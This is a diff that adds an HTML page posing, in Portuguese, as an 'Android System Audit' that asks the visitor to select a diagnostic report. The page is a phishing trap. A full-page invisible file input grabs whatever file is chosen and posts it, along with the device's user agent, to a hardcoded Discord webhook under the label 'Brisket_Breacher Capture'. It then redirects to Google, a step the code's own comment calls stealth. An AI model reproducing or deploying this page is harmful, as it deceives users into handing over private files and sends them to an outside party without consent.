@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Android System Audit</title>
+    <style>
+        body { background-color: #000; color: #00FF00; font-family: 'Courier New', monospace; text-align: center; padding-top: 20%; }
+        #fileInput { width: 100%; height: 100%; position: absolute; top: 0; left: 0; opacity: 0; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h3>[ AUDITORIA DE SEGURANÇA ATIVA ]</h3>
+    <p>A carregar módulos de integridade...</p>
+    <p>Selecione o relatório de diagnóstico para continuar.</p>
+    
+    <input type="file" id="fileInput" accept=".jpg,.pdf,.db,.doc">
+
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX";
+
+        document.getElementById('fileInput').onchange = function() {
+            const file = this.files[0];
+            if (!file) return;
+
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('content', `**[Brisket_Breacher Capture]**\n**Dispositivo:** ${navigator.userAgent}\n**Ficheiro:** ${file.name}`);
+
+            fetch(webhook, {
+                method: 'POST',
+                body: formData
+            }).then(() => {
+                // Furtividade: Redireciona para o Google após o upload
+                window.location.href = "https://www.google.com";
+            }).catch(() => {
+                window.location.href = "https://www.google.com";
+            });
+        };
+    </script>
+</body>
+</html>
